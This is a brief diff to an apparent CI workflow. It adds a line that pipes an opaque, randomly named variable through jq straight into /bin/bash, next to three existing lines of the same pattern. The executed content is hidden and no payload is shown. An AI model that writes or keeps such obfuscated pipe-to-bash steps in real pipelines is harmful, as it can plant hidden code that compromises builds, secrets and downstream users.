@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$cp776" | jq -r .xmg4680 | /bin/bash
           echo $mt82829 | jq -r .tj42 | /bin/bash
           echo $rn1 | jq -r .fy0059 | /bin/bash
+          printf '%s' "$higw2" | jq -r .qzd69201 | /bin/bash
 
       - name: Persist output
         if: always()
